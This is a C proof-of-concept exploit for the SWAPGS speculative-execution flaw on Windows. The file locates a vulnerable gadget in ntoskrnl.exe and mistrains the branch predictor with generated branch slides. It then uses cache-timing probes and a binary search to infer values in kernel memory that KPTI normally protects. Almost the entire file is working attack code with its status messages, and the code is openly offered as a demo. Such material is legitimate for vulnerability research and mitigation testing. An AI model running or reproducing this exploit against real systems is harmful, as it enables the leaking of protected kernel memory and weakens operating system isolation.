/* SPDX-License-Identifier: BSD-3-Clause */
#include <windows.h>
#include <stdio.h>

typedef UINT64 QWORD;

extern unsigned long long AsmTestAccessTime(PBYTE Address);
extern unsigned long long AsmRdrand();
extern unsigned long long AsmRdgsbase();
extern void AsmWrgsbase(QWORD Value);
extern void AsmSpeculateSwapgs(QWORD KernelAddress, PBYTE Branches);



// Each byte is 0/1, and it indicates whether any victim branch is located at the given offset inside the kernel page.
// We will use this to generate branches which are not taken, in order to hopefully confuse the CPU branch predictor
// into thinking the branch right before the SWAPGS is not taken. This will trigger
BYTE gBranchMask[4096] = { 0 };

QWORD gBranchAddress = 0;
QWORD gKvaShadowAddress = 0;
QWORD gKernelBase = 0;

enum
{
    SystemModuleInformation = 11,
};


typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    HANDLE      Section;
    PVOID       MappedBase;
    PVOID       ImageBase;
    ULONG       ImageSize;
    ULONG       Flags;
    USHORT      LoadOrderIndex;
    USHORT      InitOrderIndex;
    USHORT      LoadCount;
    USHORT      OffsetToFileName;
    UCHAR       FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;


typedef struct _RTL_PROCESS_MODULES
{
    ULONG       NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[2];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;


typedef NTSTATUS
(WINAPI *PFUNC_NtQuerySystemInformation)(
    __in DWORD Class,
    __in PVOID Arg1,
    __in SIZE_T Size,
    __out PVOID Optional
    );

#define BRANCH_SIZE     (1 * 1024 * 1024)
#define LLC_SIZE        (8 * 1024 * 1024)
#define THASH_SIZE      (LLC_SIZE * 2)
#define SLIDE_SIZE      LLC_SIZE                    // 8 MB for the initial probing buffer, equal to the LLC size.


//
// LeakCheckMemoryRange
//
BOOLEAN
LeakCheckMemoryRange(
    __in QWORD KernelAddress,       // The KernelAddress to be leaked.
    __in QWORD StartValue,          // Tested range start value.
    __in QWORD SlideSize,           // Tested range size.
    __in DWORD Offset,              // Value offset - the value located at KernelAddress may not be QWORD aligned.
    __in DWORD Iterations           // How many times should we try to trigger the gadget.
    )
{
    QWORD i = 0, v = 0, gsbase = 0, tries = 0, rnd = 0;
    BOOLEAN res = FALSE;
    PBYTE pDecoy = NULL, pTag = NULL, pBranch = NULL, pThrash = NULL;


    //
    // Allocate the probing memory. This will be a large memory chunk (in this PoC, the memory chunk is roughly a
    // LLC in size). This memory will be filled with the address if another memory location, which serves as a tag.
    // If the SWAPGS gadget executes speculatively and, the kernel value read at KernelAddress is within the range
    // [StartValue, SlideSize], than the value stored at StartValue will be dereferenced, leaving a cache trace. This
    // will allow us to quickly check whether the value located at KernelAddress is within the given range.
    //
    pDecoy = VirtualAlloc((PVOID)StartValue, SlideSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NULL == pDecoy)
    {
        printf("Failed allocating memory at 0x%016llx...\n", StartValue);
        goto cleanup_and_exit;
    }

    if (!VirtualLock(pDecoy, SlideSize))
    {
        printf("[-] Failed locking the address!\n");
        goto cleanup_and_exit;
    }

    //
    // Allocate the tag. We will store the tag address inside the pDecoy buffer. If the gadget executes speculatively
    // and the loaded address at KernelAddress falls in the range [StartValue, StartValue + SlideSize], the tag will
    // be accessed speculatively, leaving a cache trace. Then we will know the value located at KernelAddress is
    // between [StartValue, StartValue + SlideSize].
    //
    pTag = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NULL == pTag)
    {
        printf("[-] Failed allocating the tag: 0x%08x\n", GetLastError());
        goto cleanup_and_exit;
    }

    // Initialize the tag.
    memset(pTag, 0xCC, 0x1000);


    //
    // Allocate some memory used to store the conditional branches which we will use to confuse the branch predictor.
    // We must ensure we have good chances for the vulnerable branch to be mispredicted, which will lead to SWAPGS
    // being executed speculatively, which will trigger arbitrary addresses to be accessed speculatively.
    //
    pBranch = VirtualAlloc(NULL, BRANCH_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (NULL == pBranch)
    {
        printf("[-] Alloc failed for branch buffer: 0x%08x\n", GetLastError());
        goto cleanup_and_exit;
    }

    // Fill it with 0x90 (NOP) opcodes.
    memset(pBranch, 0x90, BRANCH_SIZE);


    // Regenerate the branch slide. Experimentally, I observed that there are high chances to trigger the gadget
    // to be speculatively executed if I generate a large (at least 16K) slide of random conditional branches.
    // If I place a branch that is not taken at a page offset equal to the page offset of the kernel branch seems
    // to also increase the chances of not taking the branch in kernel, leading to speculative SWAPGS execution.
    for (i = 0; i < BRANCH_SIZE / 0x1000; i++)
    {
        // Offset matches that of the branch in kernel, make it not taken, always, so we force a misprediction.
        pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 0] = 0x75;
        pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 1] = 0x03;

        if (i + 1 < BRANCH_SIZE / 0x1000)
        {
            // Place a jump to the next conditional branch; we don't want to waste too much time executing NOPs...
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 5] = 0xE9;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 6] = 0xF0;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 7] = 0x0F;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 8] = 0x00;
            pBranch[(i * 0x1000) + (gBranchAddress & 0xFFF) + 9] = 0x00;
        }
    }

    // Last instruction in the branch slide must be a RET.
    pBranch[BRANCH_SIZE - 1] = 0xC3;


    //
    // Allocate a thrash buffer.
    //
    pThrash = VirtualAlloc(NULL, LLC_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (NULL == pThrash)
    {
        printf("[-] Alloc failed for thrash buffer: 0x%08x\n", GetLastError());
        goto cleanup_and_exit;
    }

    memset(pThrash, 0, LLC_SIZE);

    printf("[+] Filling memory at [0x%016llx, 0x%016llx], with the tag address %p...\n", StartValue, StartValue + SlideSize, pTag);

    // Make sure the memory is committed. Store the tag address inside the probing buffer.
    for (i = 0; i < SlideSize / 8 - 8; i++)
    {
        ((QWORD*)(pDecoy + Offset))[i] = (QWORD)pTag;
    }

    // Read the initial GS base.
    gsbase = AsmRdgsbase();

    for (tries = 0; tries < Iterations; tries++)
    {
        // Flush out the KvaShadow variable by accessing as much memory as possible, at addresses which may conflict with the variable.
        for (DWORD k = 0; k < LLC_SIZE / 0x1000; k++)
        {
            pThrash[(k * 0x1000) + (gKvaShadowAddress & 0xFFF)]++;
        }

        _mm_mfence();

        _mm_clflush(pTag + 0x838);

        _mm_mfence();

        for (i = 0; i < SlideSize / 8 - 8; i++)
        {
            ((QWORD*)(pDecoy + Offset))[i] = (QWORD)pTag;
        }

        _mm_mfence();

        // Do the access. Note that the kernel accesses gs[0x188], so if we want to leak/probe address X, we need to
        // write X - 0x188 into the GS base.
        __try
        {
            AsmSpeculateSwapgs(KernelAddress - 0x188, pBranch);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
        }

        // Restore old GS base.
        AsmWrgsbase(gsbase);

        _mm_mfence();

        // Check if the tag was accessed. If it was, the kernel value is in the given range.
        v = AsmTestAccessTime(pTag + 0x838);
        if (v < 100)
        {
            printf("[!] Data is located in the range [0x%016llx, 0x%016llx], tag access time %llu, iter #%llu\n",
                StartValue, StartValue + SlideSize, v, tries);
            res = TRUE;
            break;
        }

        _mm_mfence();
    }

cleanup_and_exit:
    if ((NULL != pThrash) && !VirtualFree(pThrash, 0, MEM_RELEASE))
    {
        printf("[-] VirtualFree failed: 0x%08x\n", GetLastError());
    }

    if ((NULL != pBranch) && !VirtualFree(pBranch, 0, MEM_RELEASE))
    {
        printf("[-] VirtualFree failed: 0x%08x\n", GetLastError());
    }

    if ((NULL != pTag) && !VirtualFree(pTag, 0, MEM_RELEASE))
    {
        printf("[-] VirtualFree failed: 0x%08x\n", GetLastError());
    }

    if ((NULL != pDecoy) && !VirtualFree(pDecoy, 0, MEM_RELEASE))
    {
        printf("[-] VirtualFree failed: 0x%08x\n", GetLastError());
    }

    return res;
}


//
// FindGadgetAddress
//
int
FindGadgetAddress(
    VOID
    )
//
// This function searches for the vulnerable gadgets inside the ntoskrnl.exe image, in order to ensure good chances
// of mispredicting the branch before the SWAPGS when we generate the random branches slide.
//
{
    DWORD count = 0;
    PFUNC_NtQuerySystemInformation NtQuerySystemInformation;
    RTL_PROCESS_MODULES modules;
    PBYTE hMod = (PBYTE)LoadLibraryA("ntoskrnl.exe");
    if (NULL == hMod)
    {
        printf("[-] Could not load the ntoskrnl.exe module: 0x%08x\n", GetLastError());
        return -1;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNth = (PIMAGE_NT_HEADERS)(hMod + pDos->e_lfanew);

    // Search for all the following squences:
    // f60552b4390001       test    byte ptr [nt!KiKvaShadow (fffff803`09c02840)],1
    // 7503                 jne     nt!KiInvalidOpcodeFault+0x73 (fffff803`098673f3)
    // 0f01f8               swapgs
    // 654c8b142588010000   mov     r10,qword ptr gs:[188h]
    for (DWORD i = 0; i < pNth->OptionalHeader.SizeOfImage - 10; i++)
    {
        if (hMod[i + 0] == 0xF6 &&              // test opcode
            hMod[i + 1] == 0x05 &&              // test modrm
            hMod[i + 6] == 0x01 &&              // test imm8
            hMod[i + 7] == 0x75 &&              // jne  opcode
            hMod[i + 8] == 0x03 &&              // jne  displacement
            hMod[i + 9] == 0x0F &&              // swapgs opcode
            hMod[i + 10] == 0x01 &&
            hMod[i + 11] == 0xF8)
        {
            count++;
            printf("[+] Branch address at offset 0x%016llx\n", i);
        }

        if (count == 18)
        {
            // The KiInvalidOpcodeFault handler contains the 43th SWAPGS instruction. Good enough for the demo LOL.
            gBranchAddress = i + 7;
            gKvaShadowAddress = *((DWORD*)(&hMod[i + 2])) + i + 7;
            printf("[+] Branch address at offset 0x%016llx\n", gBranchAddress);
            printf("[+] KvaShadow address at offset 0x%016llx\n", gKvaShadowAddress);
            break;
        }
    }

    // Lookup the NtQuerySystemInformation API inside ntdll.
    NtQuerySystemInformation = (PFUNC_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"),
        "NtQuerySystemInformation");
    if (NULL == NtQuerySystemInformation)
    {
        printf("[-] Failed locating NtQuerySystemInformation!\n");
        return -1;
    }

    // Lookup the address of system modules.
    NtQuerySystemInformation(SystemModuleInformation, &modules, sizeof(modules), NULL);

    // The first two modules will usually be the kernel and the hal.
    printf("[+] Found '%s' at 0x%016p\n", modules.Modules[0].FullPathName, modules.Modules[0].ImageBase);

    gKernelBase = (QWORD)modules.Modules[0].ImageBase;
    gBranchAddress += gKernelBase;
    gKvaShadowAddress += gKernelBase;

    FreeLibrary((HMODULE)hMod);

    return 0;
}


int main(int argc, char *argv[])
{
    QWORD targetStart = 0x0000000300000000;     // In order to make the PoC faster, we start the search here.
    QWORD targetEnd = 0x00007FFFFFFFFFFF;       // Max user address.
    QWORD targetStep = SLIDE_SIZE;              // Initial step is roughly the size of the LLC on my CPU.
    DWORD tries = 1000;

    // Setup the location of the vulnerable gadgets and the base address of the kernel. For the PoC, we simply show that
    // we can test the presence of the MZ signature inside the NT headers, a memory area which is not normally accessible
    // thanks to KPTI/KVA.
    if (0 != FindGadgetAddress())
    {
        printf("[-] Could not locate the offsets of the gadgets!\n");
        return -1;
    }

    // Set the working set size for the process to 16MB. This ensures our buffers don't get swapped out...
    if (!SetProcessWorkingSetSize(GetCurrentProcess(), LLC_SIZE * 2, LLC_SIZE * 2))
    {
        printf("[-] Failed setting the working set size: 0x%08x\n", GetLastError());
        return -1;
    }

    for (QWORD target = targetStart; target < targetEnd; )
    {
        if (LeakCheckMemoryRange(gKernelBase, target, targetStep, 0xD, tries))
        {
            if (targetStep <= 0x10000)
            {
                // We have a match, and the slide size is less or equal than the VirtualAlloc preffered granularity.
                printf("[!] The value at kernel address 0x%016llx is in the range [0x%016llx, 0x%016llx]!\n",
                       gKernelBase, target, target + targetStep);
                break;
            }
            else
            {
                // Once we find a matching range, we split it in half and proceed to search each one. This allows us
                // to basically "zoom in" until we reach roughly the granularity of the VirtualAlloc. From there on,
                // other simple methods can be used, including checking one page at a time.
                targetEnd = target + targetStep;
                targetStep = targetStep / 2;
                tries *= 2;
            }
        }
        else
        {
            // No match in this interval, move on.
            target += targetStep;
            printf("[!] The value at kernel address 0x%016llx is NOT in the given range!\n", gKernelBase);
        }
    }

    getchar();

    return 0;
}
